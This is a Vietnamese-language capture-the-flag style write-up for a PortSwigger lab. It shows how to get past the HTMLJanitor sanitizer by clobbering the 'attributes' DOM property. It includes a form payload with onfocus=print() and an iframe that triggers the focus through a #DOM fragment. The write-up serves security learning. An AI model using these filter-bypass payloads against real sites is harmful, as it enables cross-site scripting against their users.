## Clobbering DOM attributes to bypass HTML filters

> Lab này sử dụng HTMLJanitor để lọc html, để solve được lab này chúng ta vẫn phải bypass qua filter và gọi hàm print().

![](/imgs/DOM-BASED-VULNERABILITIES/19.png?raw=true)

Đầu tiên ta sẽ inject html vào phần comment

```html
<form id=DOM tabindex=0 onfocus=print()><input id=attributes>
```

Tạo ra 1 form với ***tabindex=0*** đầu tiên sẽ nhảy vào event focus sau đó nó sẽ chạy hàm print()

Còn thẻ ***input*** đằng sau có thuộc tính id là ***attributes*** 

> Bởi vì thư viện này sử dụng “attributes” property để filter html, nó sẽ làm ẩn đi các attributes trước đó khiến cho độ dài không được xác định 

> => Từ đó có thể inject bất cứ thuộc tính event nào vào trong form nào vào trong form.

![](/imgs/DOM-BASED-VULNERABILITIES/20.png?raw=true)

Vì thế ta sẽ trigger form này bằng

```html
<iframe src="https://ac851f391ef1b93d80d8051900d90052.web-security-academy.net/post?postId=3" onload="setTimeout(()=>this.src=this.src+'#DOM',300)">
```

Set thời gian 300 để chắc chắn là form được load trước js, sau đó sẽ gọi element có id là DOM lên (http://lab-url#DOM) => id DOM có ***tabindex=0*** rồi nhảy vào focus và thực hiện hàm print()

![](/imgs/DOM-BASED-VULNERABILITIES/21.png?raw=true)

### Tài liệu tham khảo
- [DOM-based Vuln: ](https://portswigger.net/web-security/dom-based)